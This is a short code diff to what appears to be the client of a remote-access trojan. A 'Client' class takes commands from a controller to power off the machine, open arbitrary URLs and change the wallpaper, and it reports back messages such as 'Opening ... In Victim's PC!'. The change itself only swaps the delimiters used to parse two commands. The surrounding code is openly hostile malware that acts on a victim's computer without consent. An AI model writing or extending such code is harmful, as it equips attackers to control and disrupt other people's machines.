@@ -40,13 +40,13 @@ class Client():
                 os.system("poweroff")
         # Open URL
         if self.command.startswith("open_url"):
-            _,_URL_TO_OPEN=self.command.split("=")
+            _,_URL_TO_OPEN=self.command.split()
             webbrowser.open(_URL_TO_OPEN)
             self.client.send(f"Opening {_URL_TO_OPEN} In Victim's PC!".encode())
         # Change Wallpaper
         if self.command.startswith("change_wallpaper"):
             print(self.command)
-            _,_WALLPAPER_TO_CHANGE=self.command.split()
+            _,_WALLPAPER_TO_CHANGE=self.command.split("=")
             print(_WALLPAPER_TO_CHANGE)
     @property
     def os_name(self) -> str:
